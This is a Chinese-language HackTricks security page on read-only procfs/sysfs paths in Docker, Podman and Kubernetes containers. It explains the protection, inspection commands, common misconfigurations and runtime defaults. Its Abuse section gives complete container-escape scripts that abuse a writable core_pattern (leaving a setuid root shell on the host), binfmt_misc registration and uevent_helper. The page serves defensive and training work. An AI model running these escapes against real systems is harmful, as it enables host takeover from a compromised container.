# 只读系统路径

{{#include ../../../../banners/hacktricks-training.md}}

只读系统路径是区别于 masked paths 的一种独立保护机制。它不会完全隐藏某个路径，而是向 runtime 暴露该路径，同时以只读方式挂载。在选定的 procfs 和 sysfs 位置中，这种方式很常见：读取权限可能是可接受的，或在运行层面确有必要，但写入操作的风险过高。

其目的很直接：许多 kernel 接口在可写时会变得更加危险。只读挂载不会移除所有 reconnaissance 价值，但能阻止被 compromized 的 workload 通过该路径修改底层的、面向 kernel 的文件。

## 操作

Runtimes 通常会将 proc/sys 视图中的部分内容标记为只读。根据 runtime 和 host 的不同，可能包括以下路径：

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

实际列表会有所不同，但其模型相同：在需要时允许查看，默认禁止修改。<sup>[[1]](#references)</sup>

## Lab

检查 Docker 声明的只读路径列表：
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
检查容器内部挂载的 proc/sys 视图：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

只读 system paths 可缩小大类影响主机的滥用范围。即使攻击者能够检查 procfs 或 sysfs，无法向其中写入内容也会移除许多直接修改路径，包括 kernel tunables、crash handlers、module-loading helpers 或其他 control interfaces。风险并未消失，但从 information disclosure 转变为影响主机会更加困难。

## Misconfigurations

主要错误包括取消对敏感 paths 的屏蔽，或将其重新挂载为 read-write；通过可写的 bind mounts 直接暴露 host proc/sys 内容；以及使用实际上绕过更安全 runtime defaults 的 privileged modes。在 Kubernetes 中，`procMount: Unmasked` 和 privileged workloads 往往与较弱的 proc protection 同时出现。<sup>[[2]](#references)</sup> 另一个常见的 operational mistake 是认为由于 runtime 通常会将这些 paths 挂载为 read-only，因此所有 workloads 都仍然继承了该 default。

## Abuse

如果 protection 较弱，请首先查找可写的 proc/sys entries：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
当存在可写条目时，高价值的后续路径包括：
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
这些命令可以揭示以下信息：

- `/proc/sys` 下可写的条目通常意味着容器能够修改主机 kernel 行为，而不仅仅是查看相关信息。
- `core_pattern` 尤其重要，因为可写的面向主机的值可以在设置 pipe handler 后，通过使进程崩溃转化为主机 code-execution 路径。
- `modprobe` 可揭示 kernel 在与 module-loading 相关的流程中使用的 helper；当它可写时，这是一个经典的高价值目标。
- `binfmt_misc` 可以说明是否能够注册自定义 interpreter。如果注册配置可写，它就可能成为 execution primitive，而不只是信息泄露。
- `panic_on_oom` 控制主机范围内的 kernel 决策，因此可以将资源耗尽转化为主机 denial of service。
- `uevent_helper` 是可写 sysfs helper 路径产生 host-context execution 的最明显示例之一。

值得关注的发现包括：原本应该是只读状态、但实际可写的面向主机的 proc 参数或 sysfs 条目。此时，工作负载已经从受限的容器视图，转向了能够对 kernel 产生实质影响的状态。

### 完整示例：`core_pattern` 主机逃逸

如果容器内的 `/proc/sys/kernel/core_pattern` 可写，并且指向 host kernel view，那么可以在进程崩溃后滥用它来执行 payload：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
如果该路径确实能触及 host kernel，payload 会在 host 上运行，并留下一个 setuid shell。

### 完整示例：`binfmt_misc` Registration

如果 `/proc/sys/fs/binfmt_misc/register` 可写，则在执行匹配文件时，自定义 interpreter registration 可能导致 code execution：
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
在面向主机且可写的 `binfmt_misc` 上，结果是在 kernel 触发的 interpreter 路径中实现 code execution。

### 完整示例：`uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，kernel 可能会在触发匹配事件时调用一个主机路径 helper：
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
之所以如此危险，是因为 helper path 是从主机文件系统的视角解析的，而不是从安全的、仅限容器的上下文中解析的。

## 检查

这些检查用于确定 procfs/sysfs 暴露是否在预期情况下为只读，以及 workload 是否仍能修改敏感的 kernel interfaces。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
这里有哪些值得关注的内容：

- 一个正常加固的 workload 通常只应暴露极少量可写的 proc/sys 条目。
- 可写的 `/proc/sys` 路径通常比普通的读取权限更重要。
- 如果 runtime 声称某个路径为只读，但实际上可以写入，应仔细检查 mount propagation、bind mounts 和 privilege 设置。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker 为敏感的 proc 条目定义默认只读路径列表 | 暴露 host proc/sys mounts、`--privileged` |
| Podman | Enabled by default | Podman 应用默认只读路径，除非显式放宽限制 | `--security-opt unmask=ALL`、宽泛的 host mounts、`--privileged` |
| Kubernetes | Inherits runtime defaults | 使用底层 runtime 的只读路径模型，除非通过 Pod 设置或 host mounts 放宽限制 | `procMount: Unmasked`、privileged workloads、可写的 host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | 通常依赖 OCI/runtime 默认设置 | 与 Kubernetes 行相同；直接修改 runtime 配置可能削弱该行为 |

关键点是，只读系统路径通常作为 runtime 默认设置存在，但 privileged 模式或 host bind mounts 很容易破坏这一保护。

## References

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
